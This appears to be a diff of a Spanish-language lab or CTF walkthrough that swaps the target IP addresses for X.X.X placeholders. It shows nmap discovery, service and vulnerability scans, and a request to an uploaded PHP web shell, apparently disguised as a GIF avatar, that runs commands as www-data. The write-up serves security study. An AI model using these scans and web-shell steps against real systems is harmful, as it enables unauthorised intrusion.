@@ -38,15 +38,15 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.56.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.56.101```
+```nmap -sV -sC X.X.X.101```
 
 Para ver si esos puertos son vulnerables usaremos este comando:
 
-```nmap -Pn -T4 -p 80,88,110,995 --script vuln 192.168.56.101```
+```nmap -Pn -T4 -p 80,88,110,995 --script vuln X.X.X.101```
 
 ### Web
 
@@ -74,7 +74,7 @@ GIF8;
 
 Para obtener la ejecución de código remoto iremos a esta página web para utilizar el exploit anteriormente visto:
 
-```http://192.168.56.101/uploads/avatar_jose_script.php?cmd=whoami```
+```http://X.X.X.101/uploads/avatar_jose_script.php?cmd=whoami```
 
 Gracias a esto somos **www-data**
 
